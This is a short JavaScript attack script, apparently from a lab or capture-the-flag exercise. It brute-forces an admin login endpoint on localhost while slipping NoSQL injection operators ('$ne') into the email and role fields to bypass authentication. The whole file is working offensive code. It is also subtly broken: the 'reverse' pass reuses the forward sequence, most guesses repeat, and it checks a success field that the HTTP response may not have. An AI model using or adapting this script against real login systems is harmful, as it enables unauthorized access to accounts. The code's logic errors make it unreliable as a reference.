function generateSequence(maxNumber) {
	let sequence = []
	for (let i = 1; i <= maxNumber; i++) {
		for (let j = 1; j <= maxNumber; j++) {
			sequence.push(j)
		}
	}
	return sequence
}

function generateReverseSequence(maxNumber) {
	let sequence = []
	for (let i = maxNumber; i >= 1; i--) {
		for (let j = maxNumber; j >= i; j--) {
			sequence.push(j)
		}
	}
	return sequence
}

async function trySequences(url, maxNumber) {
	let sequence = generateSequence(maxNumber)
	// Attempt using forward sequence
	for (let i = 0; i < sequence.length; i++) {
		let password = sequence[i].toString()
		let response = await attemptLogin(url, password)

		if (response.success) {
			console.log(`Password found: ${password}`)
			return password
		}
	}
	// if forward sequence fails, use reverse sequence
	for (let i = 0; i < sequence.length; i++) {
		let password = sequence[i].toString()
		let response = await attemptLogin(url, password)

		if (response.success) {
			console.log(`Password found: ${password}`)
			return password
		}
	}
	console.log('Password not found')
}

async function attemptLogin(url, password) {
	const axios = require('axios')
	try {
		let response = await axios.post(url, {
			email: {"$ne": ""},
			password: password,
			role: {"$ne": ""}
		})
		return response
	}
	catch (error) {
		console.log(`Error attempting password: ${password}`, error)
		return { success: false }
	}
}

const url = 'http://127.0.0.1:5000/admin/login'

trySequences(url, 9)